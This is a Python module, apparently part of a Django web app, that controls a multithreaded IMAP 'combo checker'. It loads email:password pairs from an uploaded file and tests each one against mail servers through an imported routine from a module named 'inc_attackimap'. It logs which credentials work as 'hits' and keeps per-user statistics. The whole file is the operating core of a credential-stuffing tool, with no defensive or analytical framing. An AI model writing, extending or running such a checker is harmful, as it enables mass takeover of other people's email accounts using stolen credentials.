import logging
import threading

from queue import Queue
from time import sleep

from .inc_attackimap import imapchecker
from .inc_comboloader import comboloader

from imap.models import Combo, IMAPCheckResult, Statistics

targets_total = int(0)
targets_left = int(0)
hits = int(0)
fails = int(0)

checker_queue = Queue()

logger = logging.getLogger(__name__)


def checker_thread(default_timeout, user_id):
    '''
    Function for a single thread which performs the main checking process.

    :param float default_timeout: timeout for server connection
    :return: None
    '''

    global targets_left
    global hits
    global fails

    while True:
        target = str(checker_queue.get())
        target_email, target_password = target.split(':')

        try:
            combo = Combo.objects.filter(email=target_email, password=target_password, user_id=user_id).first()

            result = imapchecker(default_timeout, target)

            status = 'hit' if result else 'fail'
            IMAPCheckResult.objects.create(combo=combo, user_id=user_id, status=status)

            if result:
                hits += 1
            else:
                fails += 1

        except Exception as e:
            logger.error(f"Error in checker_thread: {e}")

        finally:
            targets_left -= 1
            checker_queue.task_done()


def checker(default_threads, default_timeout, file_content, user_id):
    '''
    Function to control the import of combos, to start threads etc.

    :param int default_threads: amount of threads to use
    :param float default_timeout: timeout for server-connections
    :param str file_content: string with combos to import
    :return: True (no errors occurred), False (errors occurred)
    '''
    global targets_total
    global targets_left

    try:
        combos = comboloader(file_content, user_id)
    except:
        combos = []

    targets_total = len(combos)
    targets_left = targets_total

    if targets_total > 0:
        for _ in range(default_threads):
            single_thread = threading.Thread(
                target=checker_thread,
                args=(default_timeout, user_id),
                daemon=True
            )
            single_thread.start()

        for target in combos:
            checker_queue.put(target)

        checker_queue.join()
        sleep(3.0)

    stats, created = Statistics.objects.get_or_create(user_id=user_id)
    stats.total_combos += targets_total
    stats.total_hits += hits
    stats.total_fails += fails
    stats.save()

    return True
